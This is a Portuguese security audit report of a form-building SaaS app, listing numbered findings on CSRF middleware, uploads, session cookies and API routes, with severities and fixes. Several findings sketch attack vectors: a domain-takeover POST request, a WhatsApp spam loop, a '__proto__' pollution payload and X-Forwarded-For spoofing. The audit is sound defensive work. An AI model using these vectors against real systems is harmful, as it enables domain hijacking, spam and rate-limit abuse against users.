### S1-P2-25 — Middleware CSRF check é bypassado quando `ALLOWED_ORIGINS` está vazio

- **Arquivo:** `middleware.ts:107-114`
- **Problema:** `const allowed = ALLOWED_ORIGINS.length > 0 ? ALLOWED_ORIGINS.some(...) : true`. Se `NEXT_PUBLIC_APP_URL` não está setada, `ALLOWED_ORIGINS = []` e toda request passa. Em produção, a env deve estar setada, mas se um deploy esquecer, CSRF check é completamente desabilitado.
- **Recomendação:** Em produção (`NODE_ENV === 'production'`), se `ALLOWED_ORIGINS` está vazio, logar warning ou bloquear requests write.
- **Severidade:** **P2** — defesa em profundidade.

### S1-P2-26 — Custom domain cache não tem limite de tamanho

- **Arquivo:** `middleware.ts:6`
- **Problema:** `const customDomainCache = new Map()` — sem limite de entradas. Atacante envia requests com `Host: attacker1.com`, `attacker2.com`, ... → cache cresce ilimitadamente. Em serverless com cold starts, é mitigado (cada instância tem cache próprio), mas em warm state pode consumir memória.
- **Recomendação:** Adicionar LRU com limite (ex: 1000 entradas).
- **Severidade:** **P3** — baixo impacto em serverless.

### S1-P2-27 — Middleware matcher exclui `/f/` do CSRF check

- **Arquivo:** `middleware.ts:119-129`
- **Problema:** O matcher `'/((?!_next/static|...|f/).*)'` exclui rotas `/f/*` do middleware. Isso significa que requests para `/f/slug/api/...` (path traversal) não passam pelo middleware. **Porém:** não há API routes sob `/f/`, então na prática não é explorável.
- **Severidade:** **P3** — sem impacto atual, mas observar se novas routes forem adicionadas.

---

## MÓDULO 7 — Upload (validação de arquivo, tamanho, MIME, storage security)

> **Resumo:** Upload é bem protegido: autenticação obrigatória, rate limit (10/min/user), validação de tipo MIME
> por whitelist, limite de 10MB, nome de arquivo sanitizado, storage em R2 com path por user_id.
> Achados são menores.

### S1-P2-28 — Validação MIME é client-provided, sem verificação de magic bytes

- **Arquivo:** `app/api/upload/route.ts:74`
- **Problema:** `allowedTypes.includes(file.type)` confia no MIME type enviado pelo browser (`Content-Type`). Atacante pode renomear `malware.exe` para `malware.pdf` e enviar `Content-Type: application/pdf`. O servidor armazena como PDF. Quando o dono do form baixa e abre, executa.
- **Mitigação:** Cloudflare R2 não executa arquivos. O risco é quando o dono do form baixa o PDF do R2.
- **Impacto:** Baixo — R2 é storage estático. Mas se o app evoluir para preview de PDF no browser (via `embed` ou `object` tag), risco aumenta.
- **Recomendação:** Verificar magic bytes dos primeiros bytes do buffer antes de armazenar.
- **Severidade:** **P2**

### S1-P2-29 — Upload rate limit fallback é in-memory (cold start reset)

- **Arquivo:** `lib/upload-rate-limit.ts:17-35`
- **Problema:** Quando RPC do Supabase falha, fallback é Map local. Em serverless (Vercel), cold starts resetam o Map. Mesmo padrão de P2-22 da auditoria-final (rate limit in-memory puro).
- **Severidade:** **P2** (reconfirmando achado existente)

### S1-P3-10 — Upload GET endpoint expõe status de configuração R2 (reconfirmando P2-A)

- **Arquivo:** `app/api/upload/route.ts:124-130`
- **Problema:** Agora requer auth (corrigido desde a Sessão 2). Mas ainda retorna `configured: true/false`, que é informação de infraestrutura.
- **Impacto:** Baixo — apenas usuários autenticados.
- **Severidade:** **P3** (reconfirmando P2-A da Sessão 2)

---

## MÓDULO 8 — Cookies e sessão (httpOnly, secure, sameSite, expiração, invalidação)

> **Resumo:** Cookies Supabase (sb-*) são gerenciados pelo `createServerClient` SSR, que aplica `httpOnly: true`,
> `secure: true` (em produção), `sameSite: 'lax'` por padrão. Cookie `__lastActivity` é custom.
> Achados focam no `__lastActivity` e invalidação de sessão.

### S1-P1-16 — Cookie `__lastActivity` com `httpOnly: false` permite XSS burlar inactivity timeout

- **Arquivo:** `lib/auth.ts:49`
- **Problema:** Já documentado como S1-P1-5 (P2 escalável para P1). Aqui reconfirmo: nenhum código JS client-side escreve neste cookie. O middleware (server-side) é o único writer e reader. A flag `httpOnly: false` é gratuita e perigosa — qualquer XSS pode ler e **escrever** um timestamp futuro para evitar o timeout.
- **Recomendação:** Mudar para `httpOnly: true` imediatamente. Não há código dependente de `httpOnly: false`.
- **Severidade:** **P1** (escala de S1-P1-5)

### S1-P2-30 — `signOut` no middleware de inatividade não revoga refresh token no servidor

- **Arquivo:** `lib/supabase/middleware.ts:56-60`
- **Problema:** `await supabase.auth.signOut()` no middleware revoga a sessão local mas não necessariamente o refresh token no Supabase. O refresh token pode continuar válido por até 1h (JWT lifetime). Se um atacante obteve o refresh token (via XSS), pode criar nova sessão mesmo após signOut.
- **Recomendação:** Usar `supabase.auth.admin.signOut(userId)` com service_role client para revogação global.
- **Severidade:** **P2** — já documentado em S1-P1-2.

### S1-P2-31 — Cookie `__lastActivity` usa `maxAge` mas não `expires` — inconsistência cross-browser

- **Arquivo:** `lib/auth.ts:48-54`
- **Problema:** `maxAge: INACTIVITY_TIMEOUT_MS / 1000` define 1800s (30min). `sameSite: 'lax'` está correto. `secure: process.env.NODE_ENV === 'production'` está correto. `path: '/'` está correto. `httpOnly: false` é o problema (S1-P1-16).
- **Status:** Correto exceto `httpOnly`.
- **Severidade:** N/A

### S1-P3-11 — Sem mecanismo de invalidação de sessão sob demanda (admin)

- **Problema:** Não há endpoint `/api/auth/revoke` ou `/api/admin/sessions/revoke` para invalidar sessões de usuários específicos. Se uma conta for comprometida, não há como forçar logout sem acesso ao dashboard Supabase.
- **Recomendação:** Adicionar endpoint admin que usa `auth.admin.signOut(userId)`.
- **Severidade:** **P3** — operacional.

### S1-P3-12 — `clearAuthSession` usa `console.error` em vez de `logError`

- **Arquivo:** `lib/auth.ts:73`
- **Problema:** Já documentado em S1-P3-1.
- **Severidade:** **P3**

---

## Sumário final da Sessão 1

| Severidade | Novos nesta sessão | Total (Auth + RLS + API + Forms + Player + Infra + Upload + Cookies) |
|---|---|---|
| **P0** | S1-P0-1, S1-P0-3, S1-P0-4, S1-P0-5, S1-P0-6, S1-P0-7, S1-P1-9 (billing bypass) | **10** |
| **P1** | S1-P0-2, S1-P1-1, S1-P1-2, S1-P1-6, S1-P1-7, S1-P1-8, S1-P1-11, S1-P1-12, S1-P1-13, S1-P1-14, S1-P1-15, S1-P1-16, S1-P2-21 | **16** |
| **P2** | S1-P1-3, S1-P1-4, S1-P1-5, S1-P2-1, S1-P2-2, S1-P2-4, S1-P2-7, S1-P2-8, S1-P2-9, S1-P2-10, S1-P2-11, S1-P2-12, S1-P2-17 (N/A), S1-P2-19, S1-P2-22, S1-P2-23, S1-P2-25, S1-P2-28, S1-P2-29, S1-P2-30 | **20** |
| **P3** | S1-P2-3, S1-P2-5, S1-P2-6, S1-P2-13, S1-P2-14, S1-P2-15, S1-P2-16, S1-P2-18, S1-P2-20, S1-P2-24, S1-P2-26, S1-P2-27, S1-P3-3, S1-P3-4, S1-P3-5, S1-P3-6, S1-P3-7, S1-P3-8, S1-P3-9, S1-P3-10, S1-P3-11, S1-P3-12 | **12** (S1-P2-17 N/A não conta) |

### Achados mais críticos (prioridade de correção)

1. **S1-P0-3/4/5** — RLS permite anon SELECT/UPDATE/DELETE em responses → **VAZAMENTO MASSIVO DE DADOS**. Remover policies.
2. **S1-P1-9** — Profiles RLS permite user autopromover plano → **BYPASS TOTAL DE BILLING**. Restringir colunas.
3. **S1-P0-6** — WhatsApp test sem rate limit → **BANIMENTO DO SERVIÇO WHATSAPP**. Rate limit por user.
4. **S1-P0-7** — Domain upsert permite sequestro → **PHISHING VIA DOMÍNIO VERIFICADO**. Verificar ownership antes de upsert.
5. **S1-P0-1** — Login/signup bypassam rate limit → **BRUTE-FORTE POSSÍVEL**. Rotear via API.
6. **S1-P2-21** — Content block button URL não validado → **XSS EM FORMS PÚBLICOS**. Sanitizar URL.
7. **S1-P1-6** — Funções SECURITY DEFINER sem GRANT restrito → **DoS E ENUMERAÇÃO**. Revogar PUBLIC.
8. **S1-P1-7** — Forms public expõe PII (webhook_url, notify_email, whatsapp_number) → **COMPLIANCE LGPD**. Restringir colunas.

---

**Fim da Sessão 1.**

## MÓDULO 3 — API routes (validação, rate limit, error handling, info disclosure)

> **Resumo:** 38 endpoints inventariados. Padrão de rate-limit é desigual: alguns endpoints públicos
> de alto risco (WhatsApp test, custom domains, checkout) não têm rate limit nenhum. Há vazamento
> consistente de `error.message` em vários endpoints — replicação do P0-3 da Sessão 2 que foi
> corrigido apenas em `app/api/forms`. Dois endpoints de pasta (`folders` GET/DELETE) não retornam
> resposta no caminho de sucesso (bug funcional). Sufixo de UUID não é validado em todos os
> endpoints públicos. Achados abaixo.

### S1-P0-6 — `/api/form/[id]/whatsapp/test` permite spam de WhatsApp para qualquer número, sem rate limit

- **Arquivo:** `app/api/form/[id]/whatsapp/test/route.ts:36-163`
- **Problema:** O endpoint aceita `owner_phone` e `message_template` arbitrários do body — usuário Plus+ legítimo (mas malicioso) ou um atacante que conseguiu uma sessão Plus envia mensagens WhatsApp a qualquer número, com qualquer texto, sem limite. Nenhum check de rate limit no caminho de teste. Internamente chama `/api/whatsapp/send` com o `INTERNAL_API_SECRET`, que tem rate limit por número de destino (100/h) — mas **mudando o número entre chamadas, o rate limit zera para cada número**. Resultado: cliente Plus pode enviar 100 msgs/h × N números diferentes = quantidade ilimitada.
- **Vetor:** Loop de 1000 chamadas `POST /api/form/<id-form-do-atacante>/whatsapp/test` com `owner_phone` aleatório e `message_template` "Compre Viagra em xxx". WhatsApp suspende a conta da empresa (compliance) e o número associado ao serviço VPS é banido. Custos da Meta + dano de imagem.
- **Impacto:** Banimento da conta WhatsApp Business → indisponibilidade da feature pra TODOS os clientes Plus+. Custo direto + indireto.
- **Recomendação:** (a) Rate limit por user (3 testes / hora); (b) Forçar `owner_phone` a ser igual ao `owner_phone` salvo em `form_whatsapp_settings`; (c) Forçar `message_template` ≤ 1000 chars; (d) Conteúdo do template deve passar por blacklist de spam ("compre", "viagra", "ganhe r$"); (e) Logar cada teste em `form_whatsapp_logs` (já existe a tabela) para auditoria.
- **Severidade:** **P0** — pode tirar a feature WhatsApp do ar para todos os clientes pagantes.

### S1-P0-7 — `/api/domains POST` permite tomada de domínio de outro usuário via upsert

- **Arquivo:** `app/api/domains/route.ts:57-65`
- **Problema:** O insert usa `.upsert({ domain, form_id, user_id, verified })` sem `onConflict` explícito. A tabela `custom_domains` tem PRIMARY KEY ou UNIQUE em `domain` (necessário pelo middleware de rewrite). Resultado: usuário Professional A pode chamar:
  ```http
  POST /api/domains
  Body: { "domain": "dominio-do-cliente-B.com.br", "form_id": "<form-do-A>" }
  ```
  Como já existe row com aquele domain (do cliente B), o upsert sobrescreve `user_id=A` e `form_id=<form-do-A>`. Se o domain estiver `verified=true`, o tráfego do domínio do cliente B passa a renderizar o form do A.
- **Verificação adicional necessária:** A linha 47-49 valida que `form_id` pertence ao user, mas NÃO verifica se o `domain` já está registrado por outro usuário antes de chamar `addDomain` e antes de fazer upsert.
- **Vetor:** Atacante Professional sabe um domínio já verificado (lista pública via `custom_domains` policy "Anon can read verified custom domains" — ver S1-P2-7) → chama POST com aquele domain → tráfego sequestrado.
- **Impacto:** Sequestro de domínio verificado de outro tenant. Phishing direcionado, exfiltração de dados de respondentes via form malicioso no domínio confiável.
- **Recomendação:** Antes do upsert, verificar `existing = SELECT user_id FROM custom_domains WHERE domain = ?` e rejeitar se `existing.user_id !== user.id`. Também passar `onConflict: 'domain'` explícito e usar `WHERE user_id = auth.uid()`.
- **Severidade:** **P0**

### S1-P1-11 — Vazamento de `error.message` do Supabase em múltiplos endpoints

- **Arquivos / linhas:**
  - `app/api/forms/[id]/folder/route.ts:59` — `return NextResponse.json({ error: error.message }, { status: 500 })`
  - `app/api/forms/[id]/export-csv/route.ts:90` — `return NextResponse.json({ error: (responsesError as { message: string }).message }, { status: 500 })`
  - `app/api/forms/[id]/export/route.ts:101` — `return NextResponse.json({ error: responsesError.message }, { status: 500 })`
  - `app/api/forms/[id]/duplicate/route.ts:111` — `error: duplicateError?.message ?? 'Failed to duplicate form'`
  - `app/api/auth/login/route.ts:43-46` — `error: error.message || 'Login failed'` (também documentado em S1-P1-4)
  - `app/api/checkout/[plan]/route.ts:262-263` — `const message = err instanceof Error ? err.message : ...; return NextResponse.json({ error: message }, ...)` — mensagens da API do Asaas vazam (PII de billing, IDs internos).
  - `app/api/form/[id]/whatsapp/test/route.ts:153-159` — body `details: error instanceof Error ? error.message : 'Unknown error'`
- **Problema:** Mesmo padrão do P0-3 da Sessão 2 que foi corrigido em `forms`. Mensagens cruas do Postgres/Asaas/Supabase incluem nomes de colunas, constraint violations, e às vezes valores. Em cliente, isso permite reconnaisance de schema; em endpoints públicos, é surfacing de info disclosure.
- **Recomendação:** Substituir por `'Erro interno do servidor'` + `logError()` server-side. Manter `error.code` quando útil (ex.: `23505` para unique violation já é usado em forms).
- **Severidade:** **P1**

### S1-P1-12 — `/api/forms/[id]/plan` (público) sem validação de UUID, sem rate limit, vaza plano de qualquer formulário publicado

- **Arquivo:** `app/api/forms/[id]/plan/route.ts:12-42`
- **Problema:** Endpoint é público (usa `createPublicClient` com service role) e não valida formato UUID em `id`. Qualquer pessoa pode varrer e descobrir o plano associado a cada `form.id`. Pior: combinado com S1-P0-3 da Sessão 1 (anon SELECT em forms), atacante mapeia "user X tem N formulários, todos plano professional" para escolher alvos pagantes.
- **Vetor:** `for id in [...uuids vazados via /rest/v1/forms]; GET /api/forms/$id/plan` → mapa completo de planos.
- **Impacto:** Reconhecimento direcionado: atacante prioriza ataques (S1-P0-7 hijack de domínio, etc) contra clientes professional.
- **Recomendação:** Validar UUID format. Adicionar rate limit (60/min/IP). Idealmente, retornar apenas o booleano necessário para o caller (ex.: `hasPixels`, `hideBranding`) em vez do nome do plano.
- **Severidade:** **P1**

### S1-P1-13 — `/api/checkout/[plan]` sem rate limit — abuso pode esgotar quota do Asaas

- **Arquivo:** `app/api/checkout/[plan]/route.ts:17-265`
- **Problema:** Endpoint autenticado, mas sem rate limit. Cada chamada faz pelo menos 2 round-trips para o Asaas (`createCustomer` ou `updateCustomer` + `createCheckout`). Um usuário malicioso pode disparar centenas de POSTs/segundo, consumindo quota do Asaas (rate limit do gateway), gerando logs de pagamento sujos e fazendo proration ineficiente.
- **Impacto:** Custo de operação + risco de bloqueio temporário no Asaas (service degradation).
- **Recomendação:** Rate limit por `user.id` (5 / 5min — é raro um user fazer mais de 1 checkout por minuto).
- **Severidade:** **P1**

### S1-P1-14 — `/api/checkout/status` sem rate limit — mesmo problema, polling do front é abusivo

- **Arquivo:** `app/api/checkout/status/route.ts:18-188`
- **Problema:** Endpoint autenticado e idempotente, mas o front em `app/(dashboard)/billing/page.tsx` faz polling. Sem rate limit, um cliente em loop infinito (bug ou má-intenção) pode consumir Asaas API rapidamente — cada chamada pode disparar `getSubscription` + `getCustomerSubscriptions` (2x round-trips para o Asaas). E cada `persistPlanFromAsaas` faz UPDATE no profile.
- **Impacto:** Custo Asaas + ruído nos logs; possibilidade de race com o webhook concorrente.
- **Recomendação:** Rate limit 30 / minuto por user.
- **Severidade:** **P1**

### S1-P1-15 — `/api/settings/api-key POST/DELETE` sem rate limit — pode-se rotacionar chave indefinidamente

- **Arquivo:** `app/api/settings/api-key/route.ts:6-52, 99-131`
- **Problema:** Sem rate limit, um cliente Professional pode chamar POST /api/settings/api-key 10 vezes/segundo. Cada chamada gera nova chave + invalida a anterior. Combinado com a integração v1 do cliente, pode causar disrupção (todas as integrações que usam a chave antiga param). Também: gera entropia aleatória repetidamente — drena pool em hosts com baixa entropia.
- **Vetor combinado:** XSS no dashboard → roubar API key → forçar regeneração para esconder rastros → cliente perde acesso à API até regenerar.
- **Recomendação:** Rate limit 5 / hora por user.
- **Severidade:** **P1** (escala para P0 se XSS for descoberto + algum cliente Pro estiver em produção dependendo da API).

### S1-P2-8 — `app/api/folders/route.ts:13-32` GET não retorna resposta no caminho de sucesso (bug funcional)

- **Arquivo:** `app/api/folders/route.ts:13-32`
- **Problema:** O handler GET termina em `}` na linha 32 SEM retornar `NextResponse.json({ folders: data })`. Apenas o caminho de erro retorna 500. Em sucesso, Next.js entrega 200 com body vazio. Listing de pastas no dashboard aparece sempre vazio.
- **Impacto:** Funcional — feature de pastas está visualmente quebrada (listing). Não é vulnerabilidade, mas afeta UX paga.
- **Severidade:** **P2** — bloqueia uso da feature de pastas, especialmente para clientes que organizaram dezenas de forms.

### S1-P2-9 — `app/api/folders/[id]/route.ts:58-88` DELETE não retorna resposta no caminho de sucesso (bug funcional)

- **Arquivo:** `app/api/folders/[id]/route.ts:78-88`
- **Problema:** Mesmo bug. Após `delete().eq('id', id).eq('user_id', user.id)`, se não houver erro, o handler termina sem return. O front não recebe confirmação 200 com `{success: true}`.
- **Impacto:** UX quebrada de delete; pode causar o front a tratar como erro e mostrar mensagem confusa.
- **Severidade:** **P2** — funcional.

### S1-P2-10 — `incrementResponseCount` em `/api/v1/forms/[id]` é fire-and-forget, sem retry/atomicidade

- **Arquivo:** `app/api/v1/forms/[id]/route.ts:338`
- **Problema:** Após inserir resposta, chama `await incrementResponseCount(form.user_id).catch((err) => logError(...))`. Se o increment falhar (ex.: timeout, RPC indisponível), a resposta foi salva mas o contador NÃO subiu — usuário recebe respostas grátis. Mesmo padrão do P3-G da auditoria-final. Aqui é mais grave porque é o endpoint API v1 (usado por integrações externas, alta vazão).
- **Recomendação:** Mesmo fix do `/api/responses` — usar RPC `check_and_increment_response` atômica antes do insert. Hoje `/api/v1/forms/[id]` usa `checkResponseLimit` + `incrementResponseCount` separados (race condition).
- **Severidade:** **P2** — bypass de cota de respostas via API key.

### S1-P2-11 — `/api/whatsapp/send` modo Direct bypassa plan gate

- **Arquivo:** `app/api/whatsapp/send/route.ts:165-169, 270-310`
- **Problema:** O modo "Direct" (`{ to, message }`) só checa `INTERNAL_API_SECRET`. Não verifica plano de nenhum usuário porque não há contexto de usuário. Comentário em `route.ts:271-272` admite "Direct send bypasses plan gate". Mas o segredo está em variáveis de ambiente do mesmo container que serve `/api/form/[id]/whatsapp/test` — qualquer SSRF que consiga ler `process.env.INTERNAL_API_SECRET` (ex.: via P3-F do GoogleSheets ou via vazamento de erro) pode chamar este endpoint diretamente para spam.
- **Mitigação:** Hoje o `INTERNAL_API_SECRET` só é usado pelo `/whatsapp/test` no próprio app. Se nada mais consume, remover o modo Direct. Se algo externo precisa, mover para uma outra rota com auth diferente.
- **Recomendação:** Eliminar `handleDirectSend` ou exigir signature HMAC adicional + lista de origens permitidas.
- **Severidade:** **P2**

### S1-P2-12 — `/api/admin/whatsapp/disconnect` e `/api/admin/whatsapp/status` usam `console.error` em vez de `logError`

- **Arquivos:**
  - `app/api/admin/whatsapp/disconnect/route.ts:32, 42`
  - `app/api/admin/whatsapp/status/route.ts:30, 44`
  - `app/api/folders/route.ts:29` (`console.error('Failed to list folders:', error)`)
  - `app/api/folders/[id]/route.ts:50, 86` (`console.error('Failed to update/delete folder:', error)`)
  - `app/api/forms/route.ts:48` (`console.error('Failed to list forms:', error)`)
  - `app/api/forms/[id]/route.ts:367` (`console.error('Failed to delete form:', error)`)
  - `app/api/forms/[id]/webhook/route.ts:84, 116` (`console.error('Failed to update/delete webhook:', error)`)
  - `app/api/whatsapp/send/route.ts:177` (`console.error('[whatsapp/send] Error:', error)`)
- **Problema:** `console.error` em runtime serverless (Vercel) é redirecionado para o log básico, mas o helper `logError` adiciona contexto, scrubbing de PII e roteamento para Sentry/Logtail (se configurado). Inconsistência: alguns arquivos usam `logError`, outros `console.error`. Detecção e correlação de incidentes fica difícil.
- **Severidade:** **P2** — qualidade operacional.

### S1-P2-13 — `/api/admin/users/route.ts:36` usa UUID placeholder mágico em IN clause

- **Arquivo:** `app/api/admin/users/route.ts:32-40`
- **Problema:** Quando não há `profileIds`, faz `in('user_id', ['00000000-0000-0000-0000-000000000000'])`. O UUID `00000000-...` é um valor mágico que poderia, em teoria, ser usado por algum row real (improvável mas possível). Pequeno risco de baixa qualidade.
- **Recomendação:** Skip a query inteira quando `profileIds.length === 0`.
- **Severidade:** **P3** (não é vulnerabilidade, code quality).

### S1-P2-14 — `/api/forms POST` valida `slug` com regex permissiva (aceita slugs de 1 char)

- **Arquivo:** `app/api/forms/route.ts:86`
- **Problema:** `/^[a-z0-9-]+$/` aceita slug = `a` ou `-` ou `------`. Slugs muito curtos colidem fácil (race no insert) e poluem o namespace. Slug `-` é tecnicamente válido mas esquisito.
- **Recomendação:** `/^[a-z0-9][a-z0-9-]{2,60}$/` (min 3, max 61, deve começar com alfanumérico).
- **Severidade:** **P3**

### S1-P2-15 — `/api/responses` POST: `validateAllAnswers` não valida tipos primitivos vs objects

- **Arquivo:** `app/api/responses/route.ts:209-218` + `lib/field-validators.ts`
- **Problema:** `validateAllAnswers` valida regras por tipo de pergunta, mas não valida que o valor enviado é do tipo esperado. Atacante pode mandar `answers[questionId] = { __proto__: {polluted: true} }` — em ambientes que façam merge profundo do object, abre vetor de prototype pollution. `sanitizeValue` apaga tags HTML mas preserva keys dunder.
- **Mitigação:** Next.js parser limita profundidade; `serializeAnswerValue` trata como JSON.
- **Recomendação:** Após sanitize, validar que cada `answers[k]` é primitivo, array de primitivos, ou objeto sem keys começando com `__`. Defesa em profundidade.
- **Severidade:** **P3**

### S1-P2-16 — `validateAllAnswers` não valida que questionIds enviados existem no form

- **Arquivos:** `app/api/responses/route.ts:209`, `lib/field-validators.ts`
- **Problema:** Se o body envia `answers = { "fakeId123": "x" }` para uma pergunta que NÃO existe no form, `validateAllAnswers` retorna sem erro (apenas valida tipos das perguntas existentes). O insert em `answer_items` é feito com `question_id: "fakeId123"`. Tabela `answer_items` aceita arbitrário porque não tem FK para questions JSONB. Atacante polui a tabela de analytics com IDs inexistentes — distorce relatórios e infla storage.
- **Recomendação:** Filtrar `answers` para apenas keys presentes em `form.questions[*].id` antes de inserir.
- **Severidade:** **P3**

### S1-P3-3 — Triplicação de endpoints WhatsApp settings (manutenibilidade)

- **Arquivos:**
  - `app/api/form/[id]/whatsapp/settings/route.ts` — GET, POST, PATCH, DELETE
  - `app/api/whatsapp/settings/route.ts` — GET (list), POST (create)
  - `app/api/whatsapp/settings/[formId]/route.ts` — GET, PUT, DELETE
  - `app/api/forms/[id]/whatsapp/route.ts` — GET, POST
- **Problema:** Quatro endpoints fazem CRUD sobreposto sobre `form_whatsapp_settings`. Comportamentos divergentes:
  - `forms/[id]/whatsapp` valida plan no GET (correto)
  - `whatsapp/settings/[formId]` GET NÃO valida plan (vaza settings se a sessão estiver autenticada e for o owner — owner sempre é OK, mas inconsistência)
  - `form/[id]/whatsapp/settings` DELETE NÃO valida plan (downgrade pode ainda permitir delete — OK funcionalmente, mas inconsistente)
- **Impacto:** Drift de validação. Nas correções de hoje, é fácil corrigir um arquivo e esquecer o outro.
- **Recomendação:** Consolidar em um único endpoint canônico (`/api/forms/[id]/whatsapp`).
- **Severidade:** **P3** — manutenibilidade.

### S1-P3-4 — `/api/cep/[cep]` usa rate-limit por IP via `x-forwarded-for` sem validar formato

- **Arquivo:** `app/api/cep/[cep]/route.ts:10`
- **Problema:** `req.headers.get('x-forwarded-for')?.split(',')[0]?.trim()` aceita qualquer valor. Atacante manda `X-Forwarded-For: <random uuid>` em cada request → bypass do rate limit.
- **Mitigação:** Em deploys atrás de Vercel/Cloudflare, esses headers são reescritos pelo proxy. Mas em deploys atrás de proxy customizado, vetor é real.
- **Recomendação:** Em produção, confiar apenas no header setado pelo proxy de borda (`x-vercel-forwarded-for` em Vercel, `cf-connecting-ip` em Cloudflare). Mesmo padrão se repete em vários endpoints (`/api/responses`, `/api/forms/[id]/partial-response`).
- **Severidade:** **P3**

### S1-P3-5 — `/api/responses` POST: `OPTIONS` retorna CORS `*` para todas as origens

- **Arquivo:** `app/api/responses/route.ts:39-49`
- **Problema:** Documentado intencionalmente no comentário das linhas 22-37 — formulários embarcáveis exigem CORS aberto. Mas:
  1. `Access-Control-Allow-Headers: 'Content-Type, Authorization, X-Response-Id'` — `Authorization` aberto permite que o atacante use credentials de um usuário autenticado se conseguir XHR cross-origin. (Hoje o endpoint não exige auth, então `Authorization` é vestigial.)
  2. Não há lista branca via env de "origens confiáveis" — qualquer site na internet pode embarcar form e enviar respostas.
- **Recomendação:** Remover `Authorization` do `Allow-Headers`. Considerar Turnstile/hCaptcha como camada anti-bot para origens não-conhecidas.
- **Severidade:** **P3**

